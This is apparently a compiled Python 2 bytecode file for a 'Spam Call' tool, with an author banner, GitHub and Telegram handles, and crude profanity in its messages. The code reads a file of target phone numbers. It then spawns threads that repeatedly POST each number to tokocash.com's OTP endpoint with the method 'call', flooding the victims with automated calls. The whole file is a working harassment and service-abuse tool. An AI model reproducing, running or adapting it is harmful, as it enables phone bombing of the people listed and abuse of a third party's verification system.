ó
ÞÊW\c        
   @   s  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l m Z d sg d sg d e j k rµ d Z d Z d Z	 d	 Z
 d
 Z d Z e e e	 e
 e e f Z e j e  Z n® d sÊ d e j k rd Z d Z d Z	 d Z
 d Z d Z e e e	 e
 e e f Z e j e  Z nK d Z d Z d Z	 d Z
 d Z d Z e e e	 e
 e e f Z e j e  Z d   Z d   Z y d  d l Z WnM e k
 rÔe   e   d e e
 e e	 e e e e
 e f	 GHe j   n Xd   Z e   e   x$e rys e d e d e d e d e	 d e d e	 d  Z e e d  j   Z d Z d a d a e a  d Z! Wn° e" k
 r²Z# d j$ e e
 e e e	 e#  GHe d  e   e   ni e% k
 ræd j$ e e
 e e e	  GHe j   n5 e& k
 rd j$ e e
 e e e	  GHe j   n Xd e d e d e d e	 d j$ e' e  e  GHe d  d    Z( x` e D]X Z) x t e! k rquWe) d k sle) d d! k r§qln  e d 7Z e  j* e( e) f  qlWx t e k rÚqËWd GHd e d e d e d e	 d" GHe j   qïWd S(#   iÿÿÿÿN(   t   sleept   unixt   linuxt   linux2s   [31ms   [34ms   [00ms   [33ms   [36mt    t   wint   darwinc           C   sa   d s d s d t  j k r+ t j d  n2 d s@ d t  j k rP t j d  n t j d  d  S(   NR   R   R   t   clearR   R   t   cls(   t   syst   platformt   ost   system(    (    (    s   sc.pyR      s
    c           C   s   d GHd j  t t  GHd j  t t t t  GHd j  t t t t  GHd j  t t t t  GHd j  t t t t  GHd j  t t t t  GHd GHd  S(   NR   s   {} ____  {}  ____s+   {}/ ___| {} / ___|  {}| {}Author   : Kontols)   {}\___ \ {}| |      {}| {}Code     : Ulars8   {} ___) |{}| |___   {}| {}Github   : github.com/afelfgies2   {}|____/ {} \____|  {}| {}telegram : t.me/afelfgies    {}* {}Spam{}Call {}*(   t   formatt   Rt   Xt   Yt   W(    (    (    s   sc.pyt	   Bannerinf&   s    sG         %s[%s!%s] %sCAN'T IMPORT MODULE [7mrequests%s%s[00m %s[%s!%s]

c          C   s/   t  j }  t j |  |  t  j  t j   } d  S(   N(   R	   t
   executableR   t   execlt   argvt   getcwd(   t   pythont   curdir(    (    s   sc.pyt   res6   s    	t   [t   +s   ] s   List Nomor Targets   : t   ri    id   s   
{}[{}!{}] {}KONTOL: {}{}i   s+   
{}[{}!{}] {}ERROR: {}Kontol Interrupt ...
s+   

{}[{}!{}] {}ERROR: {}Memek Interrupt ...
s   read {} numbers from {}i   c         C   sâ   t  d 7a  |  j   }  d } i |  j   d 6d d 6} i d d 6} t j | d | d	 | } x
 t rj qa Wt a d
 t d t d t d t d t	 t
 j    d |  d | j   d d GHt a t d 7a t  d 8a  d S(   Ni   s"   https://www.tokocash.com/oauth/otpt   msisdnt   callt   acceptt   XMLHttpRequests   X-Requested-Witht   datat   headerss   R   R   s   ] s   [0xs   ]: s
    (status: t   codet   )(   t   running_threadst   rstript   requestst   postt
   print_usedt   TrueR   t   BR   t   strt   threadt	   get_identt   jsont   Falset   processc(   t   numbert   urlR!   R"   R   (    (    s   sc.pyt   processW   s    
	S

t   ;s   Success Send Semua Ke No List(+   R-   R	   R   R
   t   randomt   timeR    R   R+   R   R   R   t   nt   randt   choicet   PR   R   R'   t   ImportErrort   exitR   R*   t	   raw_inputt   filet   opent	   readlinest   numberst   countR1   R%   R0   R)   t   max_threadst   IOErrort   eR   t   KeyboardInterruptt   EOFErrort   lenR4   R2   t   start_new_thread(    (    (    s   sc.pyt   <module>   s   <			$		<


7
	
%